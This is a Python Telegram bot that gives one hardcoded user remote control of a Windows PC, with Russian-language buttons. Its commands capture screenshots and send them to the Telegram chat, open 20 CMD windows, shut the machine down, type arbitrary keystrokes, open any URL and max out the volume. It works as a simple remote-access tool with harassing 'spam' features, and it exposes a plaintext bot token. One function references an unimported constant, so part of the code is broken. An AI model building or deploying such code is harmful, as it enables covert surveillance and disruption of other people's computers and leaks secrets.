import os
import telebot
from telebot import types
import pyautogui
import subprocess
import psutil
import webbrowser
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER

TOKEN = '8039669622:AAHjN4DHB7bWlwsBKbbMsvDOyxrbNPOk4QA'
ALLOWED_ID = 8194220203

bot = telebot.TeleBot(TOKEN)

def is_authorized(message):
    return message.from_user.id == ALLOWED_ID

@bot.message_handler(commands=['start'])
def start(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "❌ Нет доступа.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📸 Скриншот", callback_data='screenshot'),
        types.InlineKeyboardButton("📋 Блокнот", callback_data='notepad'),
        types.InlineKeyboardButton("❌ Закрыть окно", callback_data='close_window'),
        types.InlineKeyboardButton("🖱 Управление мышкой", callback_data='mouse_move'),
        types.InlineKeyboardButton("💣 CMD Спам", callback_data='cmd_spam'),
        types.InlineKeyboardButton("🔌 Выключить", callback_data='shutdown'),
        types.InlineKeyboardButton("🧠 Системная информация", callback_data='sysinfo'),
        types.InlineKeyboardButton("🌐 Открыть ссылку", callback_data='open_link'),
        types.InlineKeyboardButton("🖊 Управление клавиатурой", callback_data='keyboard_control'),
        types.InlineKeyboardButton("🔊 Установить звук на 100%", callback_data='set_volume')
    )

    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ALLOWED_ID:
        bot.answer_callback_query(call.id, "❌ Нет доступа")
        return

    if call.data == 'screenshot':
        try:
            # Изменение пути сохранения скриншота на рабочий стол
            screenshot = pyautogui.screenshot()
            desktop_path = os.path.expanduser("~/Desktop/screen.png")
            screenshot.save(desktop_path)
            with open(desktop_path, 'rb') as f:
                bot.send_photo(call.message.chat.id, f)
            bot.send_message(call.message.chat.id, "📸 Скриншот сделан и отправлен.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"Ошибка при создании скриншота: {e}")

    elif call.data == 'notepad':
        subprocess.Popen(["notepad.exe"])
        bot.send_message(call.message.chat.id, "📋 Notepad открыт.")

    elif call.data == 'close_window':
        try:
            window = pyautogui.getActiveWindow()
            if window:
                window.close()
                bot.send_message(call.message.chat.id, "❌ Активное окно закрыто.")
            else:
                bot.send_message(call.message.chat.id, "⚠️ Не удалось найти окно.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"Ошибка: {e}")

    elif call.data == 'cmd_spam':
        for _ in range(20):
            subprocess.Popen("start cmd", shell=True)
        bot.send_message(call.message.chat.id, "💣 Запущено 20 окон CMD.")

    elif call.data == 'shutdown':
        os.system("shutdown /s /t 10")
        bot.send_message(call.message.chat.id, "🔌 ПК будет выключен через 10 секунд.")

    elif call.data == 'mouse_move':
        pyautogui.moveTo(100, 100, duration=1)
        bot.send_message(call.message.chat.id, "🖱 Мышка перемещена.")

    elif call.data == 'sysinfo':
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        msg = f"🧠 CPU: {cpu}%\n💾 RAM: {ram}%"
        bot.send_message(call.message.chat.id, msg)

    elif call.data == 'open_link':
        msg = bot.send_message(call.message.chat.id, "Введите URL ссылки:")
        bot.register_next_step_handler(msg, handle_link)

    elif call.data == 'keyboard_control':
        msg = bot.send_message(call.message.chat.id, "Введите текст для ввода:")
        bot.register_next_step_handler(msg, handle_keyboard_input)

    elif call.data == 'set_volume':
        set_volume_to_max(call.message.chat.id)

def handle_keyboard_input(message):
    text = message.text
    try:
        pyautogui.typewrite(text)
        bot.send_message(message.chat.id, "🖊 Текст введен.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при вводе текста: {e}")

def handle_link(message):
    link = message.text
    webbrowser.open(link)
    bot.send_message(message.chat.id, f"🌐 Открываю ссылку: {link}")

def set_volume_to_max(chat_id):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)  # Установка громкости на 100%
    bot.send_message(chat_id, "🔊 Громкость была установлена на 100%.")

bot.polling()

